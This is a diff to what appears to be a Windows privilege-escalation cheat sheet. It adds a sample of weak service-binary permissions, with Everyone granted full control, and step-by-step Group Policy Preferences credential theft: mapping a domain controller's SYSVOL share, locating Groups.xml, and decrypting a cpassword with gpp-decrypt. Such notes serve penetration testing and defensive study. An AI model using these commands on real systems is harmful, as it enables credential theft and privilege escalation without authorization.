@@ -54,3 +54,35 @@ To start:
 ```
 powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
 ```
+
+* Windows Service Configuration Viewver:
+
+```
+ scsiaccess.exe  
+ NT AUTHORITY\SYSTEM:(I)(F)  
+ BUILTIN\Administrators:(I)(F)  
+ BUILTIN\Users:(I)(RX)  
+ APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
+ Everyone:(I)(F)
+```
+
+* Group Policy Preferences
+
+```
+#map the Domain controller SYSVOL share
+
+net use z:\\dc01\SYSVOL
+
+#Find the GPP file: Groups.xml
+
+dir /s Groups.xml
+
+#Review the contents for passwords
+
+type Groups.xml
+
+#Decrypt using GPP Decrypt
+
+gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
+```
+
